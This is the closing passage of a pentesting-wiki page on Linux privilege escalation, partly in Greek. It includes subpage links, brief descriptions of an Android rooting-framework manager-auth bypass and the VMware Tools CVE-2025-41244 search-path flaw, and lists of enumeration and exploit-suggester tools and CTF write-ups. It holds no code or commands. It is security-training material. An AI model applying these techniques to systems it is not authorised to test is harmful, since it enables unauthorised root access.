nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες Ασφάλειας του Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Εντοπίζει ευπάθειες του kernel σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
